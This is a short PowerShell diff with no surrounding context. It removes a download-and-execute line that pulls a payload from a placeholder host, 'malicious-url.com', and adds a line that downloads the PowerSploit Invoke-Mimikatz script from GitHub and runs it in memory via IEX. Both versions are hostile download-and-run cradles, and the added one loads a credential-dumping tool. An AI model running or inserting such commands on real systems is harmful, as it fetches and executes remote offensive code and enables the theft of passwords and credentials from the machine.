@@ -1,2 +1,1 @@
-$script = 'IEX (New-Object Net.WebClient).DownloadString("http://malicious-url.com/payload.ps1")'
-Invoke-Expression $script
+IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowershellMafia/Powersploit/refs/heads/master/Exfiltration/Invoke-Mimikatz.ps1')
